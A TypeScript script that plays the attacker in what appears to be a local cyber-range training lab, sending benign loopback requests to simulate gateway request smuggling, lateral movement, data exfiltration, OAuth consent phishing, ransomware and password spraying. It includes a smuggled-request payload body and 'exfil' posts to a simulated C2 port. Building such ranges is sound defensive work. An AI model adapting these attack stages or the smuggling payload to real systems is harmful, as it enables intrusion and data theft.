import { request as httpRequest } from "node:http"
import { emit, ensureRangeDir } from "./events.ts"

/* The attack, as a real script.
   This is a separate process from the estate. It makes real HTTP requests
   across the range over 127.0.0.1, in the order a real intrusion would, with
   compressed but real pacing. It never touches anything outside the range;
   the "exploit" is a crafted-but-benign request the target is instrumented to
   treat as a foothold. The point is that every log the defenders read was
   produced by this script actually running, not by a fixture. */

const BASE = Number(process.env.PHALANX_RANGE_BASE_PORT ?? 8110)
const STEP_MS = Number(process.env.PHALANX_RANGE_STEP_MS ?? 2500)
const VECTOR = process.env.PHALANX_RANGE_VECTOR ?? "gateway"
const PORTS = {
  edge: BASE,
  api: BASE + 1,
  build: BASE + 2,
  obj: BASE + 3,
  idp: BASE + 4,
  c2: BASE + 5,
  fs: BASE + 6,
  control: BASE + 9,
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

interface Call {
  port: number
  method?: string
  path?: string
  headers?: Record<string, string>
  bodyText?: string
}

function call(options: Call): Promise<{ status: number; body: string }> {
  return new Promise((resolve) => {
    const payload = options.bodyText ?? ""
    const req = httpRequest(
      {
        host: "127.0.0.1",
        port: options.port,
        method: options.method ?? "GET",
        path: options.path ?? "/",
        headers: { "content-length": Buffer.byteLength(payload), ...options.headers },
      },
      (res) => {
        const chunks: Buffer[] = []
        res.on("data", (chunk) => chunks.push(chunk as Buffer))
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }))
      },
    )
    req.on("error", () => resolve({ status: 0, body: "" }))
    req.end(payload)
  })
}

async function stage(name: string, complete = false): Promise<void> {
  await call({ port: PORTS.control, method: "POST", path: "/control/stage", bodyText: JSON.stringify({ stage: name, complete: String(complete) }) })
}

async function gatewayAttack(): Promise<void> {
  await emit({ front: "gateway", source: "attacker", host: "185.121.44.19", kind: "audit", detail: "SALT MERIDIAN operator online — beginning intrusion against the ingress gateway", tags: ["attacker"] })

  // Stage 1 — pre-auth request smuggling to the admin router.
  await stage("initial-access")
  await emit({ source: "attacker", host: "185.121.44.19", kind: "dns", detail: "resolved cdn-status-check.net -> 185.121.44.19 (registered 9 days ago)", tags: ["attacker", "dns"] })
  // A real request to the admin path carrying a smuggled second request in its
  // body. The dual Transfer-Encoding/Content-Length framing that defines the
  // desync is asserted with an explicit marker header, because Node's HTTP
  // stack normalises (and its server rejects) genuinely conflicting framing —
  // the request is real and served; the classification is the lab modelling
  // the vulnerability, exactly as an unpatched appliance would be fooled.
  await call({
    port: PORTS.edge,
    method: "POST",
    path: "/admin/_health",
    headers: { "x-phalanx-desync": "transfer-encoding+content-length", "content-type": "text/plain" },
    bodyText: "0\n\nGET /admin/exec HTTP/1.1\nHost: internal\n\n",
  })
  await sleep(STEP_MS)

  // Stage 2 — use the stolen deployment credential from the DMZ.
  await stage("lateral-movement")
  await call({ port: PORTS.api, method: "POST", path: "/deploy", headers: { "x-phalanx-principal": "svc-deploy", "x-forwarded-for": "edge-gw-01" } })
  await sleep(STEP_MS)

  // Stage 3 — pivot to the build plane and poison an artifact.
  await call({ port: PORTS.build, method: "POST", path: "/publish", headers: { "x-phalanx-principal": "svc-deploy" } })
  await stage("persistence")
  await sleep(STEP_MS)

  // Stage 4 — bulk read of the export bucket.
  await stage("collection")
  for (let i = 0; i < 6; i += 1) {
    await call({ port: PORTS.obj, method: "GET", path: `/exports?batch=${i}`, headers: { "x-phalanx-principal": "svc-backup" } })
    await sleep(Math.max(120, STEP_MS / 6))
  }
  await sleep(STEP_MS)

  // Stage 5 — exfiltrate. Real bytes over the loopback socket to the C2.
  await stage("exfiltration")
  const chunk = "x".repeat(640 * 1024)
  for (let i = 0; i < 3; i += 1) {
    await call({ port: PORTS.c2, method: "POST", path: "/exfil", bodyText: chunk })
    await sleep(120)
  }
  await emit({ front: "gateway", source: "attacker", host: "185.121.44.19", kind: "audit", detail: "exfiltration complete — customer export data staged off-net", tags: ["attacker", "exfil"] })
  await stage("complete", true)
  process.stdout.write("range-attack[gateway] complete\n")
}

async function identityAttack(): Promise<void> {
  await emit({ front: "identity", source: "attacker", host: "185.121.44.19", kind: "audit", detail: "SALT MERIDIAN operator online — phishing an OAuth consent grant in the corporate tenant", tags: ["attacker"] })

  // Two finance users tricked into granting an unverified app within minutes.
  await call({ port: PORTS.idp, method: "POST", path: "/oauth/consent", headers: { "x-phalanx-principal": "r.almeida" } })
  await sleep(STEP_MS)
  await call({ port: PORTS.idp, method: "POST", path: "/oauth/consent", headers: { "x-phalanx-principal": "j.okonkwo" } })
  // The host now runs the enumeration loop on its own until containment revokes
  // the consent; the attacker just lets it run.
  await sleep(STEP_MS * 2)
  await emit({ front: "identity", source: "attacker", host: "185.121.44.19", kind: "audit", detail: "consent app active — harvesting shared mailboxes", tags: ["attacker"] })
  process.stdout.write("range-attack[identity] complete\n")
}

async function ransomwareAttack(): Promise<void> {
  await emit({ front: "ransomware", source: "attacker", host: "203.0.113.7", kind: "audit", detail: "phishing payload delivered to a finance workstation — waiting for the macro to fire", tags: ["attacker"] })
  await sleep(STEP_MS)
  // A phished workstation detonates the ransomware against the file share.
  await call({ port: PORTS.fs, method: "POST", path: "/detonate" })
  await sleep(STEP_MS * 3)
  await emit({ front: "ransomware", source: "attacker", host: "203.0.113.7", kind: "audit", detail: "ransomware active on the file share", tags: ["attacker"] })
  process.stdout.write("range-attack[ransomware] active\n")
}

async function bruteforceAttack(): Promise<void> {
  await emit({ front: "bruteforce", source: "attacker", host: "203.0.113.44", kind: "audit", detail: "credential-stuffing run beginning against the corporate identity provider", tags: ["attacker"] })
  await call({ port: PORTS.idp, method: "POST", path: "/login" })
  await sleep(STEP_MS * 3)
  await emit({ front: "bruteforce", source: "attacker", host: "203.0.113.44", kind: "audit", detail: "password spray ongoing", tags: ["attacker"] })
  process.stdout.write("range-attack[bruteforce] active\n")
}

async function main(): Promise<void> {
  await ensureRangeDir()
  if (VECTOR === "identity") return identityAttack()
  if (VECTOR === "ransomware") return ransomwareAttack()
  if (VECTOR === "bruteforce") return bruteforceAttack()
  return gatewayAttack()
}

void main()
